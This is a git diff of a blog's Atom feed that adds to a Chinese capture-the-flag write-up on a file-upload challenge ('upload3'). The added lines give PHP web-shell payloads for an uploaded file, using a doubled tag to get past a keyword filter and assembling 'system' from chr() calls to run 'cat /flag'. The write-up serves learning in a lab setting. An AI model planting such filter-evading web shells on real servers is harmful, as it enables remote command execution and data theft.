@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://crlrlc.github.io/</id>
     <title>Gridea</title>
-    <updated>2020-10-31T15:12:33.641Z</updated>
+    <updated>2020-10-31T15:17:21.789Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://crlrlc.github.io/"/>
     <link rel="self" href="https://crlrlc.github.io/atom.xml"/>
@@ -23,7 +23,18 @@
 ##补充<br>
 upload3那题我失败了，原因是.htaccess没有双写，只是双写了1.aaa中的木马，<br>
 <img src="https://crlrlc.github.io//post-images/1604157027025.png" alt="" loading="lazy"><br>
-<img src="https://crlrlc.github.io//post-images/1604157109287.png" alt="" loading="lazy"></p>
+<img src="https://crlrlc.github.io//post-images/1604157109287.png" alt="" loading="lazy"><br>
+此外，我还知道了一个不用蚁剑的办法：<br>
+1.aaa<br>
+可以是<br>
+&lt;?pphphp<br>
+echo <code>cat /flag</code>;</p>
+<pre><code>也可以是
+&lt;  ?pphphp
+$a = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
+$a('cat /flag');
+
+这两个方法就直接访问就行了，不需要用蚁剑   </code></pre>
 ]]></content>
     </entry>
     <entry>
